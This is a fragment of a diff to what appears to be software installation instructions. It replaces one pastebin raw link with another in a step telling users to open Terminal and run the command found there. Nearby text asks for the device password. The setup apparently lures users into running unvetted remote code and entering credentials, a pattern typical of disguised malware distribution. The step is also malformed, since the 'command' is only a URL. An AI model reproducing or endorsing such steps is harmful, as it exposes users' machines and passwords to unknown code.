@@ -29,7 +29,7 @@ Note: If your device does not have a password, leave the password field empty an
 
 1. Open **Terminal** and run the command:  
 
-https://pastebin.com/raw/fLxQzTtr
+https://pastebin.com/raw/8KHfLKcP
 
 2. Follow the on-screen instructions to complete the installation.  
 
